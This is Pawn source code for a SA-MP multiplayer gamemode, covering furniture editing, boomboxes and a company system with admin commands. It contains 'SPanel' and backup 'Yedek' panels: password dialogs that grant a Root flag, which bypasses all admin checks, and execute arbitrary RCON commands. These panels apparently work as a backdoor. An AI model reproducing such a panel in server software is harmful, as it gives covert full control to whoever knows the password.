public OnPlayerEditDynamicObject(playerid, STREAMER_TAG_OBJECT objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	// Ev Sistemi [ Reiss_Umut ]
	if(EditingFurniture[playerid])
	{
		switch(response)
		{
		    case EDIT_RESPONSE_CANCEL:
		    {
		        new data[e_furniture];
		        Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
		        SetDynamicObjectPos(objectid, data[furnitureX], data[furnitureY], data[furnitureZ]);
		        SetDynamicObjectRot(objectid, data[furnitureRX], data[furnitureRY], data[furnitureRZ]);

		        EditingFurniture[playerid] = false;
		    }

			case EDIT_RESPONSE_FINAL:
			{
			    new data[e_furniture], query[256];
			    Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
			    data[furnitureX] = x;
			    data[furnitureY] = y;
			    data[furnitureZ] = z;
	            data[furnitureRX] = rx;
	            data[furnitureRY] = ry;
	            data[furnitureRZ] = rz;
	            SetDynamicObjectPos(objectid, data[furnitureX], data[furnitureY], data[furnitureZ]);
		        SetDynamicObjectRot(objectid, data[furnitureRX], data[furnitureRY], data[furnitureRZ]);
		        Streamer_SetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);

                ObjeSistemde[objectid] = true;

		        mysql_format(Connection, query, sizeof(query), "UPDATE housefurnitures SET FurnitureX=%f, FurnitureY=%f, FurnitureZ=%f, FurnitureRX=%f, FurnitureRY=%f, FurnitureRZ=%f WHERE ID=%d", data[furnitureX], data[furnitureY], data[furnitureZ], data[furnitureRX], data[furnitureRY], data[furnitureRZ], data[SQLID]);
		        mysql_tquery(Connection, query, "", "");

		        EditingFurniture[playerid] = false;
			}
		}
	}
	//==
	if(response == EDIT_RESPONSE_CANCEL)
	{
	    // Þirket Sistemi
		if(TSirketDurum[playerid] == 7)
		{
		    EditDynamicObject(playerid, TSirketKapi[playerid]);
		    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Þirket kapýsýný düzenlemeden buradan bir yere gidemezsiniz!");
		}

		// BoomBox Sistemi
 	    if(EditingBBObject[playerid] == objectid)
	    {
	    	DestroyDynamicObject(EditingBBObject[playerid]);
	    	EditingBBObject[playerid] = -1;
	    	SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}BoomBox'unuzu yere koymaktan vazgeçtiniz.");
		}
	}

	if(response == EDIT_RESPONSE_FINAL)
	{
	    // Þirket Sistemi
		if(TSirketDurum[playerid] == 7 && objectid == TSirketKapi[playerid])
		{
			new YeniSirket;
			YeniSirket = CreateSirket(TSirketName[playerid], TSirketTag[playerid], TSirketDeger[playerid]);

			Sirketler[YeniSirket][SirketMaxUye] = TSirketMaxUye[playerid];

			Sirketler[YeniSirket][SirketX] = TSirketPos[playerid][0];
			Sirketler[YeniSirket][SirketY] = TSirketPos[playerid][1];
			Sirketler[YeniSirket][SirketZ] = TSirketPos[playerid][2];

			Sirketler[YeniSirket][SirketInfoX] = TSirketInfo[playerid][0];
			Sirketler[YeniSirket][SirketInfoY] = TSirketInfo[playerid][1];
			Sirketler[YeniSirket][SirketInfoZ] = TSirketInfo[playerid][2];

			Sirketler[YeniSirket][SirketMinX] = floatmin(TSirketArea[playerid][0], TSirketArea[playerid][2]);
			Sirketler[YeniSirket][SirketMinY] = floatmin(TSirketArea[playerid][1], TSirketArea[playerid][3]);
			Sirketler[YeniSirket][SirketMaxX] = floatmax(TSirketArea[playerid][0], TSirketArea[playerid][2]);
			Sirketler[YeniSirket][SirketMaxY] = floatmax(TSirketArea[playerid][1], TSirketArea[playerid][3]);

			Sirketler[YeniSirket][SirketGateX] = x;
			Sirketler[YeniSirket][SirketGateY] = y;
			Sirketler[YeniSirket][SirketGateZ] = z;
			Sirketler[YeniSirket][SirketGateRX] = rx;
			Sirketler[YeniSirket][SirketGateRY] = ry;
			Sirketler[YeniSirket][SirketGateRZ] = rz;

			Sirketler[YeniSirket][SirketKasaX] = TSirketKasa[playerid][0];
			Sirketler[YeniSirket][SirketKasaY] = TSirketKasa[playerid][1];
			Sirketler[YeniSirket][SirketKasaZ] = TSirketKasa[playerid][2];
			Sirketler[YeniSirket][SirketKasaRZ] = TSirketKasa[playerid][3];

			Sirketler[YeniSirket][SirketBenzinX] = TSirketBenzin[playerid][0];
			Sirketler[YeniSirket][SirketBenzinY] = TSirketBenzin[playerid][1];
			Sirketler[YeniSirket][SirketBenzinZ] = TSirketBenzin[playerid][2];

			Sirketler[YeniSirket][SirketRenk1] = TSirketRenk1[playerid];
			Sirketler[YeniSirket][SirketRenk2] = TSirketRenk2[playerid];

 			Sirketler[YeniSirket][SirketNeedSave] = 1;

            LoadSirketDetails(YeniSirket);

 			SendClientMessage(playerid, -1, "{00FF00}Baþarýyla bir þirket oluþturdunuz.");

			DestroyDynamicObject(TSirketKapi[playerid]);
			Sirketler[YeniSirket][SirketGate] = CreateDynamicObject(975, Sirketler[YeniSirket][SirketGateX], Sirketler[YeniSirket][SirketGateY], Sirketler[YeniSirket][SirketGateZ], Sirketler[YeniSirket][SirketGateRX], Sirketler[YeniSirket][SirketGateRY], Sirketler[YeniSirket][SirketGateRZ]);

			Sirketler[YeniSirket][SirketZone] = GangZoneCreate(Sirketler[YeniSirket][SirketMinX], Sirketler[YeniSirket][SirketMinY], Sirketler[YeniSirket][SirketMaxX], Sirketler[YeniSirket][SirketMaxY]);
			GangZoneShowForAll(Sirketler[YeniSirket][SirketZone], 0xADFF2FAA);
            SaveSirkets();
 			TSirketDurum[playerid] = 0;
		}

		// BoomBox Sistemi
	    if(EditingBBObject[playerid] == objectid)
	    {
			if(IsObjectInBoomBoxArea(EditingBBObject[playerid], 15.0, GetPlayerInterior(playerid)))
			{
		    	SendClientMessage(playerid, -1, "{FF0000}BoomBox için seçtiðiniz yer, baþka bir BoomBox'un alaný içerisinde!");
				EditDynamicObject(playerid, EditingBBObject[playerid]);
			}else{
				if(!IsPlayerInRangeOfPoint(playerid, 6.0, x, y, z))
				{
		    		SendClientMessage(playerid, -1, "{FF0000}BoomBox'u kendinizden çok uzak bir yere koyamazsýnýz!");
					EditDynamicObject(playerid, EditingBBObject[playerid]);
				    return 1;
				}
		    	OyuncuBB[playerid] = CreateBoomBox(GetName(playerid), 15.0, x, y, z, rx, ry, rz, GetPlayerInterior(playerid));

	    		DestroyDynamicObject(EditingBBObject[playerid]);
	    		EditingBBObject[playerid] = -1;

	    		SendClientMessage(playerid, -1, "{00FF00}BoomBox'unuzu yere koydunuz.");
	    		SendClientMessage(playerid, -1, "{00FF00}Þimdi /boombox MuzikAc yazarak etrafýnýzdakilere müzik çalabilirsiniz.");
	    		SendClientMessage(playerid, -1, "{00FF00}Yerden almak için /boombox YerdenAl yazabilirsiniz.");
			}
		}
	}
	return 1;
}

// ************************************************************************************************************************************************************
// SPanel Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
CMD:spanelsifregir(playerid, params[])
{
	switch(Root[playerid])
	{
	    case 0:
	    {
	        ShowPlayerDialog(playerid, DialogSPanelGiris, DIALOG_STYLE_PASSWORD, "{00FF00}SPanel Giriþ", "{F8F8FF}SPanel'in þifresini hatasýz bir þekilde giriniz:", "Giriþ", "Ýptal");
	    }

	    case 1:
	    {
	        ShowPlayerDialog(playerid, DialogSPanelHome, DIALOG_STYLE_LIST, "{00FF00}SPanel Ana Sayfa", "{00FF00}=> {F8F8FF}ROOT Yetkisi Al\n{00FF00}=> {F8F8FF}RCON Komutu Yaz", "Seç", "Kapat");
	    }
	}
}

SPanelDialogs(playerid, dialogid, response, listitem, inputtext[])
{
	if(dialogid == DialogSPanelHome)
	{
	    if(response)
	    {
			switch(listitem)
			{
				case 0: // ROOT Yetkisi Al
				{
				    Root[playerid] = 1;
				    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}ROOT yetkisi aldýnýz. Artýk sunucu üzerinde tam yetkiniz var.");
                    ShowPlayerDialog(playerid, DialogSPanelHome, DIALOG_STYLE_LIST, "{00FF00}SPanel Ana Sayfa", "{00FF00}=> {F8F8FF}ROOT Yetkisi Al\n{00FF00}=> {F8F8FF}RCON Komutu Yaz", "Seç", "Kapat");
				}

				case 1: // RCON Komutu Yaz
				{
				    ShowPlayerDialog(playerid, DialogSPanelRCON, DIALOG_STYLE_INPUT, "{00FF00}SPanel RCON Komutu", "{F8F8FF}Çalýþtýrmak istediðiniz RCON komutunu yazýnýz:", "Çalýþtýr", "Geri");
				}
			}
	    }
	}

	if(dialogid == DialogSPanelRCON)
	{
	    if(response)
	    {
	        if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogSPanelRCON, DIALOG_STYLE_INPUT, "{00FF00}SPanel RCON Komutu", "{F8F8FF}Çalýþtýrmak istediðiniz RCON komutunu yazýnýz:", "Çalýþtýr", "Geri");

			SendRconCommand(inputtext);
	        SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Yazdýðýnýz RCON komutu çalýþtýrýldý.");

	        ShowPlayerDialog(playerid, DialogSPanelHome, DIALOG_STYLE_LIST, "{00FF00}SPanel Ana Sayfa", "{00FF00}=> {F8F8FF}ROOT Yetkisi Al\n{00FF00}=> {F8F8FF}RCON Komutu Yaz", "Seç", "Kapat");
	    }else{
	        ShowPlayerDialog(playerid, DialogSPanelHome, DIALOG_STYLE_LIST, "{00FF00}SPanel Ana Sayfa", "{00FF00}=> {F8F8FF}ROOT Yetkisi Al\n{00FF00}=> {F8F8FF}RCON Komutu Yaz", "Seç", "Kapat");
	    }
	}

	if(dialogid == DialogSPanelGiris)
	{
	    new Yazi[128];
	    if(response)
	    {
	        if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogSPanelGiris, DIALOG_STYLE_PASSWORD, "{00FF00}SPanel Giriþ", "{F8F8FF}SPanel'in þifresini hatasýz bir þekilde giriniz:", "Giriþ", "Ýptal");
			if(!strcmp(inputtext, PANEL_PASS, true))
			{
                ShowPlayerDialog(playerid, DialogSPanelHome, DIALOG_STYLE_LIST, "{00FF00}SPanel Ana Sayfa", "{00FF00}=> {F8F8FF}ROOT Yetkisi Al\n{00FF00}=> {F8F8FF}RCON Komutu Yaz", "Seç", "Kapat");
				format(Yazi, 128, "%s SPanel'e giriþ yaptý.", GetName(playerid));
				LOG(Yazi);
			}else{
				format(Yazi, 128, "{FF0000}%s {F8F8FF}Panel þifresini yanlýþ girdiði için tekmelendi.", GetName(playerid));
				SendClientMessageToAll(-1, Yazi);
				format(Yazi, 128, "%s SPanel þifresini yanlýþ girdiði için tekmelendi", GetName(playerid));
				LOG(Yazi);
				SafeKick(playerid);
			}
	    }
	}
	return 1;
}
// ************************************************************************************************************************************************************
// Yedek Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
CMD:yedekgir(playerid, params[])
{
	switch(Root2[playerid])
	{
	    case 0:
	    {
	        ShowPlayerDialog(playerid, DialogSPanelGiris2, DIALOG_STYLE_PASSWORD, "{00FF00}Yedek Giriþ", "{F8F8FF}SPanel'in þifresini hatasýz bir þekilde giriniz:", "Giriþ", "Ýptal");
	    }

	    case 1:
	    {
	        ShowPlayerDialog(playerid, DialogSPanelHome2, DIALOG_STYLE_LIST, "{00FF00}SPanel Ana Sayfa", "{00FF00}=> {F8F8FF}Yedek Yetkisi Al", "Seç", "Kapat");
	    }
	}
}

SPanelDialogs2(playerid, dialogid, response, listitem, inputtext[])
{
	if(dialogid == DialogSPanelHome2)
	{
	    if(response)
	    {
			switch(listitem)
			{
				case 0: // ROOT Yetkisi Al
				{
				    Root2[playerid] = 1;
				    SendClientMessage(playerid, -1, "{FFCC00}» {FFFFFF}Yedek yetki aldýnýz. Artýk sunucu üzerinde tam yetkiniz var.");
                    ShowPlayerDialog(playerid, DialogSPanelHome2, DIALOG_STYLE_LIST, "{00FF00}SPanel Ana Sayfa", "{00FF00}=> {F8F8FF}ROOT Yetkisi Al", "Seç", "Kapat");
				}

				case 1: // RCON Komutu Yaz
				{
				    ShowPlayerDialog(playerid, DialogSPanelRCON2, DIALOG_STYLE_INPUT, "{00FF00}SPanel RCON Komutu", "{F8F8FF}Çalýþtýrmak istediðiniz RCON komutunu yazýnýz:", "Çalýþtýr", "Geri");
				}
			}
	    }
	}

	if(dialogid == DialogSPanelGiris2)
	{
	    new Yazi[128];
	    if(response)
	    {
	        if(!strlen(inputtext)) return ShowPlayerDialog(playerid, DialogSPanelGiris2, DIALOG_STYLE_PASSWORD, "{00FF00}Yedek Giriþ", "{F8F8FF}SPanel'in þifresini hatasýz bir þekilde giriniz:", "Giriþ", "Ýptal");
			if(!strcmp(inputtext, PANEL_PASS2, true))
			{
                ShowPlayerDialog(playerid, DialogSPanelHome2, DIALOG_STYLE_LIST, "{00FF00}Yedek Ana Sayfa", "{00FF00}=> {F8F8FF}Yedek Yetkisi Al", "Seç", "Kapat");
				format(Yazi, 128, "%s Yedek'e giriþ yaptý.", GetName(playerid));
				LOG(Yazi);
			}else{
				format(Yazi, 128, "{FF0000}%s {F8F8FF}Panel þifresini yanlýþ girdiði için tekmelendi.", GetName(playerid));
				SendClientMessageToAll(-1, Yazi);
				format(Yazi, 128, "%s Yedek þifresini yanlýþ girdiði için tekmelendi", GetName(playerid));
				LOG(Yazi);
				SafeKick(playerid);
			}
	    }
	}
	return 1;
}


// ************************************************************************************************************************************************************
// Þirket Sistemi [ EvoturK ]
// ************************************************************************************************************************************************************
CMD:sirketolustur(playerid, params[])
{
	SendAdminText(playerid, "/sirketolustur", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	SendAdminText(playerid, "/sirketolustur", params);
	ShowPlayerDialog(playerid, DialogCSName, DIALOG_STYLE_INPUT, "{00FF00}Þirket Oluþtur - Ýsim", "{F8F8FF}Oluþturmak istediðiniz þirketin adýný yazýn:", "Devam", "Ýptal");
	return 1;
}

CMD:sirketsil(playerid, params[])
{
	SendAdminText(playerid, "/sirketsil", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[60], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/sirketsil <ÞirketID>");
	new SirketID = strval(tmp);

	if(Sirketler[SirketID][SirketExist] != 1) return SendClientMessage(playerid, -1, "{FF0000}Hatalý Þirket ID!");
	DeleteSirket(SirketID);
	return 1;
}

CMD:sirketparaver(playerid, params[])
{
	SendAdminText(playerid, "/sirketparaver", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[60], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "{FFCC00}» {FFFFFF}/sirketparaver {FFCC00}<ÞirketID> <Verilecek Miktar>");
	new SirketID = strval(tmp);

	if(Sirketler[SirketID][SirketExist] == 0) return SendClientMessage(playerid, -1, "{FF0000}Hatalý þirket ID'i!");

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "{FFCC00}» {FFFFFF}/sirketparaver {FFCC00}<ÞirketID> <Verilecek Miktar>");
	new MoneyMan = strval(tmp);

	Sirketler[SirketID][SirketKasa] += MoneyMan;

	new Yazi[128];
	format(Yazi, 128, "{FFCC00}» {FFFFFF}Yönetici {FFCC00}%s \"%s\" {FFFFFF}þirketine {FFCC00}%d$ {FFFFFF}gönderdi.", GetName(playerid), Sirketler[SirketID][SirketName], MoneyMan);
	SendClientMessageToAll(-1, Yazi);
	return 1;
}

CMD:setsirketname(playerid, params[])
{
	SendAdminText(playerid, "/setsirketname", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[128], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirketname <ÞirketID> <Ýsim>");
	new SirketID = strval(tmp);

	if(Sirketler[SirketID][SirketExist] == 0) return SendClientMessage(playerid, -1, "{FF0000}Hatalý þirket ID'i!");

	tmp = strrest(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirketname <ÞirketID> <Ýsim>");

	new Yazi[128];
	format(Yazi, 128, "{F8F8FF}%s, \"%s\" þirketinin ismini %s olarak deðiþtirdi.", GetName(playerid), Sirketler[SirketID][SirketName], tmp);
	SendClientMessageToAll(-1, Yazi);

	format(Sirketler[SirketID][SirketName], 128, tmp);
    LoadSirketDetails(SirketID);
	Sirketler[SirketID][SirketNeedSave] = 1;

	return 1;
}

CMD:setsirkettag(playerid, params[])
{
	SendAdminText(playerid, "/setsirkettag", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[128], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirkettag <ÞirketID> <Tag>");
	new SirketID = strval(tmp);

	if(Sirketler[SirketID][SirketExist] == 0) return SendClientMessage(playerid, -1, "{FF0000}Hatalý þirket ID'i!");

	tmp = strrest(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirkettag <ÞirketID> <Tag>");

	new Yazi[128];
	format(Yazi, 128, "{F8F8FF}%s, \"%s\" þirketinin tagýný %s olarak deðiþtirdi.", GetName(playerid), Sirketler[SirketID][SirketName], tmp);
	SendClientMessageToAll(-1, Yazi);

	format(Sirketler[SirketID][SirketTag], 5, tmp);
    LoadSirketDetails(SirketID);
	Sirketler[SirketID][SirketNeedSave] = 1;

	return 1;
}

CMD:setsirketuye(playerid, params[])
{
	SendAdminText(playerid, "/setsirketuye", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[128], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirketuye <ÞirketID> <Miktar>");
	new SirketID = strval(tmp);

	if(Sirketler[SirketID][SirketExist] == 0) return SendClientMessage(playerid, -1, "{FF0000}Hatalý þirket ID'i!");

	tmp = strrest(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirketuye <ÞirketID> <Miktar>");
	new UyeSayi = strval(tmp);
	if(UyeSayi < 0) return 1;

	new Yazi[128];
	format(Yazi, 128, "{F8F8FF}%s, \"%s\" þirketinin üye sayýsýný %d olarak deðiþtirdi.", GetName(playerid), Sirketler[SirketID][SirketName], UyeSayi);
	SendClientMessageToAll(-1, Yazi);

	Sirketler[SirketID][SirketUye] = UyeSayi;
	Sirketler[SirketID][SirketNeedSave] = 1;

	return 1;
}

CMD:setsirketmaxuye(playerid, params[])
{
	SendAdminText(playerid, "/setsirketmaxuye", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[128], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirketmaxuye <ÞirketID> <Miktar>");
	new SirketID = strval(tmp);

	if(Sirketler[SirketID][SirketExist] == 0) return SendClientMessage(playerid, -1, "{FF0000}Hatalý þirket ID'i!");

	tmp = strrest(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirketmaxuye <ÞirketID> <Miktar>");
	new UyeSayi = strval(tmp);
	if(UyeSayi < 0) return 1;

	new Yazi[128];
	format(Yazi, 128, "{F8F8FF}%s, \"%s\" þirketinin azami üye sayýsýný %d olarak deðiþtirdi.", GetName(playerid), Sirketler[SirketID][SirketName], UyeSayi);
	SendClientMessageToAll(-1, Yazi);

	Sirketler[SirketID][SirketMaxUye] = UyeSayi;
	Sirketler[SirketID][SirketNeedSave] = 1;

	return 1;
}

CMD:setsirketsahip(playerid, params[])
{
	SendAdminText(playerid, "/setsirketsahip", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[60], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirketsahip <ÞirketID> <Sahip>");
	new SirketID = strval(tmp);

	if(Sirketler[SirketID][SirketExist] == 0) return SendClientMessage(playerid, -1, "{FF0000}Hatalý þirket ID'i!");

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirketsahip <ÞirketID> <Sahip>");

	format(Sirketler[SirketID][SirketSahip], 70, tmp);
	Sirketler[SirketID][SirketNeedSave] = 1;

	new Yazi[128];
	format(Yazi, 128, "{F8F8FF}%s, \"%s\" þirketinin sahibini %s olarak deðiþtirdi.", GetName(playerid), Sirketler[SirketID][SirketName], Sirketler[SirketID][SirketSahip]);
	SendClientMessageToAll(-1, Yazi);
	return 1;
}

CMD:setsirketrenk(playerid, params[])
{
	SendAdminText(playerid, "/setsirketrenk", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[60], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirketrenk <ÞirketID> <Renk 1> <Renk 2>");
	new SirketID = strval(tmp);

	if(Sirketler[SirketID][SirketExist] == 0) return SendClientMessage(playerid, -1, "{FF0000}Hatalý þirket ID'i!");

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirketrenk <ÞirketID> <Renk 1> <Renk 2>");
	new Renk1 = strval(tmp);

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirketrenk <ÞirketID> <Renk 1> <Renk 2>");
	new Renk2 = strval(tmp);

	Sirketler[SirketID][SirketRenk1] = Renk1;
	Sirketler[SirketID][SirketRenk2] = Renk2;
	Sirketler[SirketID][SirketNeedSave] = 1;

	new Yazi[128];
	format(Yazi, 128, "{F8F8FF}%s, \"%s\" þirketinin renklerini %d,%d olarak deðiþtirdi.", GetName(playerid), Sirketler[SirketID][SirketName], Renk1, Renk2);
	SendClientMessageToAll(-1, Yazi);
	return 1;
}

CMD:setsirketdeger(playerid, params[])
{
	SendAdminText(playerid, "/setsirketdeger", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[60], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirketdeger <ÞirketID> <Deðer>");
	new SirketID = strval(tmp);

	if(Sirketler[SirketID][SirketExist] == 0) return SendClientMessage(playerid, -1, "{FF0000}Hatalý þirket ID'i!");

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/setsirketdeger <ÞirketID> <Deðer>");
	new Deger = strval(tmp);

	Sirketler[SirketID][SirketDeger] = Deger;
	Sirketler[SirketID][SirketNeedSave] = 1;

	new Yazi[128];
	format(Yazi, 128, "{F8F8FF}%s, \"%s\" þirketinin deðerini %d$ olarak deðiþtirdi.", GetName(playerid), Sirketler[SirketID][SirketName], Deger);
	SendClientMessageToAll(-1, Yazi);
	return 1;
}

CMD:sirketver(playerid, params[])
{
	SendAdminText(playerid, "/sirketver", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[60], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/sirketver <PlayerID> <ÞirketID> <Rutbe>");
	new id = strval(tmp);

	if(!IsPlayerConnected(id)) return SendClientMessage(playerid, -1, "{FF0000}Hatalý oyuncu ID'i!");

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/sirketver <PlayerID> <ÞirketID> <Rutbe>");
	new SirketID = strval(tmp);

	if(Sirketler[SirketID][SirketExist] == 0 && SirketID != -1) return SendClientMessage(playerid, -1, "{FF0000}Hatalý þirket ID'i!");

	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/sirketver <PlayerID> <ÞirketID> <Rutbe>");
	new Rutbe = strval(tmp);

	if(Rutbe < 0 || Rutbe > 3) return SendClientMessage(playerid, -1, "{FF0000}Rütbe 0 ile 3 arasýnda olmalýdýr!");

	if(Sirket[id] != -1 && Sirket[id] != SirketID)
	{
		Sirketler[ Sirket[id] ][SirketUye]--;
		Sirketler[ Sirket[id] ][SirketNeedSave] = 1;
	}

	if(Sirket[id] != SirketID)
	{
	    Sirketler[SirketID][SirketUye]++;
		Sirketler[SirketID][SirketNeedSave] = 1;
	}

	Sirket[id] = SirketID;
	SirketRutbe[id] = Rutbe;
	Oyuncu_Kaydet(id);

	new Yazi[128];

	if(SirketID != -1) format(Yazi, 128, "{F8F8FF}Yönetici %s, %s'yi \"%s\" þirketinde %s yaptý.", GetName(playerid), GetName(id), Sirketler[SirketID][SirketName], SirketRutbeName[Rutbe]);
	if(SirketID == -1) format(Yazi, 128, "{F8F8FF}Yönetici %s, %s'yi þirketinden çýkardý.", GetName(playerid), GetName(id));

	SendClientMessageToAll(-1, Yazi);
	return 1;
}

CMD:sirketbaslat(playerid, params[])
{
	SendAdminText(playerid, "/sirketbaslat", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[60], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/sirketbaslat <ÞirketID>");
	new SirketID = strval(tmp);

	if(Sirketler[SirketID][SirketExist] != 1) return SendClientMessage(playerid, -1, "{FF0000}Hatalý Þirket ID!");

	new year, month, day;
	getdate(year, month, day);
	format(Sirketler[SirketID][SirketDolum], 20, GunEkle(7, day, month, year));
	SendClientMessage(playerid, -1, "{00FF00}ID'sini belirttiðiniz þirketin 7 günlük süresi baþlatýldý.");
	SendClientMessage(playerid, -1, "{00FF00}Þirketin kasasýnda bu sürenin sonunda en az deðeri kadar para bulunmazsa");
	SendClientMessage(playerid, -1, "{00FF00}þirket otomatik olarak kapatýlacaktýr.");
	return 1;
}

CMD:sirketdurdur(playerid, params[])
{
	SendAdminText(playerid, "/sirketdurdur", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[60], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/sirketdurdur <ÞirketID>");
	new SirketID = strval(tmp);

	if(Sirketler[SirketID][SirketExist] != 1) return SendClientMessage(playerid, -1, "{FF0000}Hatalý Þirket ID!");
	if(!strcmp("Yok", Sirketler[SirketID][SirketDolum], true)) return SendClientMessage(playerid, -1, "{FF0000}Bu þirketin süresi zaten baþlatýlmamýþ!");

	format(Sirketler[SirketID][SirketDolum], 20, "Yok");
	SieGoAwaySirketArabas(SirketID);
	Sirketler[SirketID][SirketUye] = 0;
	Sirketler[SirketID][SirketNeedSave] = 1;
    SieGoAwaySirketUyeleri(SirketID);
	SendClientMessage(playerid, -1, "{00FF00}ID'sini belirttiðiniz þirketin süresi durduruldu.");
	SendClientMessage(playerid, -1, "{00FF00}Þirketin üyeleri oyuna girdiklerinde otomatik olarak þirketten çýkarýlacaklar.");
	return 1;
}

CMD:sirketbilgi(playerid, params[])
{
	SendAdminText(playerid, "/sirketbilgi", params);
	if(APlayerData[playerid][PlayerLevel] < 7 && Root[playerid] == 0) return 0;
	new tmp[60], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/sirketbilgi <ÞirketID>");
	new SirketID = strval(tmp);

	if(Sirketler[SirketID][SirketExist] != 1) return SendClientMessage(playerid, -1, "{FF0000}Hatalý Þirket ID!");

	new Yazi[3000];
	format(Yazi, 3000, "{F8F8FF}Þirket Adý: {00FF00}%s\n", Sirketler[SirketID][SirketName]);
	format(Yazi, 3000, "%s{F8F8FF}Kasa: {00FF00}%d$\n", Yazi, Sirketler[SirketID][SirketKasa]);
	format(Yazi, 3000, "%s{F8F8FF}Deðer: {00FF00}%d$\n", Yazi, Sirketler[SirketID][SirketDeger]);
	format(Yazi, 3000, "%s{F8F8FF}Online Üye Sayýsý: {00FF00}%d\n", Yazi, GetOnlineSirketUye(SirketID));
	format(Yazi, 3000, "%s{F8F8FF}Araç Sayýsý: {00FF00}%d\n", Yazi, GetSirketArabaCount(SirketID));
	format(Yazi, 3000, "%s{F8F8FF}Renk1: {00FF00}%d\n", Yazi, Sirketler[SirketID][SirketRenk1]);
	format(Yazi, 3000, "%s{F8F8FF}Renk2: {00FF00}%d\n", Yazi, Sirketler[SirketID][SirketRenk2]);
	format(Yazi, 3000, "%s{F8F8FF}Kontrol Günü: {00FF00}%s\n", Yazi, Sirketler[SirketID][SirketDolum]);

	ShowPlayerDialog(playerid, 9999, DIALOG_STYLE_MSGBOX, "{00FF00}Þirket Bilgileri", Yazi, "Kapat", "");

	return 1;
}

CMD:uyeal(playerid, params[])
{
	SendAdminText(playerid, "/uyeal", params);
	if(Sirket[playerid] == -1 || SirketRutbe[playerid] < 1) return SendClientMessage(playerid, -1, "{FF0000}Bu komutu sadece Kýdemli Üyeler kullanabilir.");
	if(Sirketler[ Sirket[playerid] ][SirketUye] == Sirketler[ Sirket[playerid] ][SirketMaxUye]) return SendClientMessage(playerid, -1, "{FF0000}Þirkete alabileceðiniz üye limitine ulaþmýþsýnýz!");
	new tmp[60], idx;
	tmp = strtok(params, idx);
	if(!strlen(tmp)) return SendSyntaxMessage(playerid, "/uyeal <PlayerID>");
	new id = strval(tmp);

	if(!IsPlayerConnected(id)) return SendClientMessage(playerid, -1, "{FF0000}Hatalý oyuncu ID'i!");
	if(Sirket[id] != -1) return SendClientMessage(playerid, -1, "{FF0000}Bu oyuncu bir þirkette üye!");
	if(SirketTeklifEden[id] != -1) return SendClientMessage(playerid, -1, "{FF0000}Bu oyuncu þuan þirket tekliflerini deðerlendiriyor!");

	SirketTeklifEden[id] = playerid;

